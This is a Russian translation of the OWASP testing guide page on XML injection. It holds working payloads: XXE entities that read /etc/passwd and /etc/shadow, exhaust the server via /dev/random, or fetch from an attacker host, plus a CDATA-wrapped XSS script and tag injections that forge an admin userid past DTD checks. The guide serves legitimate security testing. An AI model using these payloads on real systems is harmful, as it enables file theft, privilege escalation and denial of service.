---

layout: col-document
title: WSTG - Latest
tags: WSTG

---

{% include breadcrumb.html %}
# Тестирование XML-инъекций

|ID          |
|------------|
|WSTG-INPV-07|

## Обзор

Тестирование XML-инъекций — это когда тестировщик пытается вставить XML-документ в приложение. Если синтаксический анализатор XML (парсер) не может проверить контекст данных, тест даёт положительный результат.

В этом разделе описываются практические примеры XML-инъекций. Сначала будет определён обмен XML-сообщениями и объяснены принципы его работы. Затем — метод обнаружения, в котором мы попытаемся вставить XML-метасимволы. Как только будет выполнен первый шаг, у тестировщика будет некоторая информация о структуре XML, поэтому можно будет попробовать ввести XML-данные и теги (инъекция тегов).

## Задачи тестирования

- Найти точки входа для XML-инъекций.
- Оценить типы атак, которые можно провести, и степень их воздействия.

## Как тестировать

Предположим, что есть некое web-приложение, использующее обмен XML-сообщениями для регистрации пользователей. Это делается путём создания и добавления нового узла `user` в файл `xmlDb`.

Предположим, файл xmlDB выглядит следующим образом:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
</users>
```

Когда пользователь регистрируется, заполняя HTML-форму, приложение получает его данные в стандартном запросе, который для простоты предполагается отправлять в запросе `GET`.

Например, следующие значения:

```txt
Username: tony
Password: Un6R34kb!e
E-mail: s4tan@hell.com
```

дают запрос:

`http://www.example.com/addUser.php?username=tony&password=Un6R34kb!e&email=s4tan@hell.com`

Тогда приложение создаёт следующий узел:

```xml
<user>
    <username>tony</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```

который будет добавлен в xmlDB:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
    <user>
    <username>tony</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
    </user>
</users>
```

### Обнаружение

Первый шаг для проверки приложения на наличие уязвимости XML-инъекции состоит в попытке вставить XML-метасимволы.

XML-метасимволы — это:

- Одинарная кавычка: `'` — если этот символ не нейтрализовывать, он может вызывать исключения во время парсинга XML, если введённое значение попадёт в значение атрибута в теге.

В качестве примера предположим, что есть следующий атрибут:

`<node attrib='$inputValue'/>`

Итак, если

`inputValue = foo'`

вставляется как значение атрибута

`<node attrib='foo''/>`

то результирующий XML-документ имеет неправильный формат.

- Двойная кавычка: `"` — этот символ имеет то же значение, что и одинарная, и может использоваться, если значение атрибута заключено в двойные кавычки.

`<node attrib="$inputValue"/>`

Итак, если

`$inputValue = foo"`

подстановка даёт:

`<node attrib="foo""/>`

и полученный XML-документ невалиден.

- Угловые скобки: `>` и `<` — добавляя открывающую или закрывающую угловые скобки в пользовательский ввод

`Username = foo<`

приложение строит новый узел:

```xml
<user>
    <username>foo<</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```

но из-за наличия незакрытой `<` результирующий XML-документ невалиден.

- Тег комментария: `<!--/-->` — эта последовательность символов интерпретируется как начало/конец комментария. Таким образом, введя один из них в параметр имени пользователя:

`Username = foo<!--`

приложение создаст узел типа:

```xml
<user>
    <username>foo<!--</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```

что не является допустимой последовательностью в XML.

- Амперсанд: `&` — используется в синтаксисе XML для представления объектов. Формат объекта: `&symbol;`. Сущность сопоставляется с символом в наборе символов Unicode.

Например:

`<tagnode>&lt;</tagnode>`

правильно оформлен и валиден, представляет собой ASCII-символ `<`.

Если `&` не кодируется как `&amp;`, его можно использовать для проверки XML-инъекции.

На самом деле, если дан ввод, подобный:

`Username = &foo`

будет создан новый узел:

```xml
<user>
    <username>&foo</username>
    <password>Un6R34kb!e</password>
    <userid>500</userid>
    <mail>s4tan@hell.com</mail>
</user>
```

но, опять же, документ невалиден: `&foo` не заканчивается `;` а сущность `&foo;` не определена.

- Разделители разделов CDATA: `<!\[CDATA\[ / ]]>` — разделы CDATA используются для экранирования блоков текста, содержащих символы, которые иначе были бы распознаны как разметка. Другими словами, символы, заключенные в разделе CDATA, не анализируются XML-парсером.

Например, если есть необходимость представить строку `<foo>` внутри текстового узла, можно использовать раздел CDATA:

```xml
<node>
    <![CDATA[<foo>]]>
</node>
```

здесь `<foo>` не будет интерпретировано как разметка, а будет рассматриваться как символьные данные.

Если узел создан следующим образом:

`<username><![CDATA[<$userName]]></username>`

тестировщик может попытаться ввести конечную строку CDATA `]]>`, чтобы попытаться сделать невалидным XML-документ.

`userName = ]]>`

это приведёт к:

`<username><![CDATA[]]>]]></username>`

что не является допустимым фрагментом XML.

Ещё один тест с тегом CDATA. Предположим, что XML-документ обрабатывается для создания HTML-страницы. В этом случае разделители разделов CDATA могут быть просто удалены без дальнейшей проверки их содержимого. Затем можно ввести HTML-теги, которые будут включены в сгенерированную страницу, полностью минуя имеющиеся процедуры нейтрализации.

Рассмотрим конкретный пример. Предположим, у нас есть узел, содержащий некоторый текст, который будет отображаться пользователю.

```xml
<html>
    $HTMLCode
</html>
```

Тогда злоумышленник может ввести следующие данные:

`$HTMLCode = <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>`

и получить следующий узел:

```xml
<html>
    <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
</html>
```

В процессе обработки разделители разделов CDATA удаляются, в результате чего создаётся следующий HTML-код:

```html
<script>
    alert('XSS')
</script>
```

в результате приложение уязвимо для XSS.

Внешняя сущность: Набор допустимых сущностей может быть расширен путем определения новых. Если определение сущности — это URI, такая называется внешней. Если не настроено иное, внешние сущности заставляют XML-парсер обращаться к ресурсу, указанному в URI, например, к файлу на локальном компьютере или к удалённой системе. Такое поведение подвергает приложение угрозам XML eXternal Entity (XXE), которые могут быть использованы для отказа в обслуживании локальной системы, получения несанкционированного доступа к файлам на локальной машине, сканирования удалённых машин и отказа в обслуживании удалённых систем.

Для проверки на наличие уязвимостей XXE можно использовать следующие входные данные:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///dev/random" >]>
        <foo>&xxe;</foo>
```

Этот тест может привести к сбою web-сервера (в системе UNIX), если XML-парсер попытается заменить сущность содержимым файла /dev/random.

Другие полезные тесты:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>

<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]><foo>&xxe;</foo>
```

### Инъекция тегов

Как только первый шаг будет выполнен, тестировщик получит некоторую информацию о структуре XML-документа. Затем можно попробовать вставить свои XML-данные и теги. Мы покажем пример того, как это может привести к атаке с повышением привилегий.

Рассмотрим предыдущее приложение. Вставив следующие значения:

```txt
Username: tony
Password: Un6R34kb!e
E-mail: s4tan@hell.com</mail><userid>0</userid><mail>s4tan@hell.com
```

приложение создаст новый узел и добавит его в XML-базу данных:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
    <user>
        <username>tony</username>
        <password>Un6R34kb!e</password>
        <userid>500</userid>
        <mail>s4tan@hell.com</mail>
        <userid>0</userid>
        <mail>s4tan@hell.com</mail>
    </user>
</users>
```

Результирующий XML-файл имеет правильный формат. Более того, вполне вероятно, что для пользователя tony значение, связанное с тегом userid, будет последним, т.е. 0 (идентификатор администратора). Другими словами, мы добавили пользователя с правами администратора.

Единственная проблема заключается в том, что тег userid появляется дважды в последнем пользовательском узле. Часто XML-документы связаны с xsd-схемой или DTD и будут отклонены, если не соответствуют им.

Предположим, что документ XML определяется следующим DTD:

```xml
<!DOCTYPE users [
    <!ELEMENT users (user+) >
    <!ELEMENT user (username,password,userid,mail+) >
    <!ELEMENT username (#PCDATA) >
    <!ELEMENT password (#PCDATA) >
    <!ELEMENT userid (#PCDATA) >
    <!ELEMENT mail (#PCDATA) >
]>
```

Обратите внимание, что узел идентификатора пользователя (userid) определён с кардинальным числом равным 1. В этом случае атака, которую мы показали ранее (и другие простые атаки), не сработает, если XML-документ проверяется на соответствие его DTD до выполнения какой-либо обработки.

Однако эту проблему можно решить, если тестировщик контролирует значение некоторых узлов, предшествующих узлу-нарушителю (в данном примере — userid). На самом деле тестер может закомментировать такой узел, введя последовательность начала/конца комментария:

```txt
Username: tony
Password: Un6R34kb!e</password><!--
E-mail: --><userid>0</userid><mail>s4tan@hell.com
```

В этом случае получается следующая XML-база данных:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<users>
    <user>
        <username>gandalf</username>
        <password>!c3</password>
        <userid>0</userid>
        <mail>gandalf@middleearth.com</mail>
    </user>
    <user>
        <username>Stefan0</username>
        <password>w1s3c</password>
        <userid>500</userid>
        <mail>Stefan0@whysec.hmm</mail>
    </user>
    <user>
        <username>tony</username>
        <password>Un6R34kb!e</password><!--</password>
        <userid>500</userid>
        <mail>--><userid>0</userid><mail>s4tan@hell.com</mail>
    </user>
</users>
```

Исходный узел `userid` был закомментирован, остался только добавленный. Теперь документ соответствует своим правилам DTD.

## Анализ исходного кода

Следующие Java API могут быть уязвимы для XXE, если их не настроить должным образом.

```text
javax.xml.parsers.DocumentBuilder
javax.xml.parsers.DocumentBuildFactory
org.xml.sax.EntityResolver
org.dom4j.*
javax.xml.parsers.SAXParser
javax.xml.parsers.SAXParserFactory
TransformerFactory
SAXReader
DocumentHelper
SAXBuilder
SAXParserFactory
XMLReaderFactory
XMLInputFactory
SchemaFactory
DocumentBuilderFactoryImpl
SAXTransformerFactory
DocumentBuilderFactoryImpl
XMLReader
Xerces: DOMParser, DOMParserImpl, SAXParser, XMLParser
```

Проверьте исходный код, запрещены ли docType, внешние DTD и внешние сущности?

- [Памятка по предотвращению внешних сущностей в XML (XXE)](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

Кроме того, [Java POI office reader](https://poi.apache.org/) может быть уязвим для XXE, если версия ниже 3.10.1.

Версию библиотеки POI можно определить по имени файла JAR. Например,

- `poi-3.8.jar`
- `poi-ooxml-3.8.jar`

Следующие ключевые слова могут применяться в исходном коде на Си:

- libxml2: xmlCtxtReadMemory,xmlCtxtUseOptions,xmlParseInNodeContext,xmlReadDoc,xmlReadFd,xmlReadFile ,xmlReadIO,xmlReadMemory, xmlCtxtReadDoc ,xmlCtxtReadFd,xmlCtxtReadFile,xmlCtxtReadIO
- libxerces-c: XercesDOMParser, SAXParser, SAX2XMLReader

## Инструменты

- [Строки для фаззинга XML-инъекций (из инструмента wfuzz)](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt)

## Ссылки

- [XML-инъекция](https://www.whitehatsec.com/glossary/content/xml-injection)
- [Gregory Steuck, "XXE (Xml eXternal Entity) attack"](https://seclists.org/bugtraq/2002/Oct/420)
- [Памятка OWASP по предотвращению внешних сущностей в XML (XXE)](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
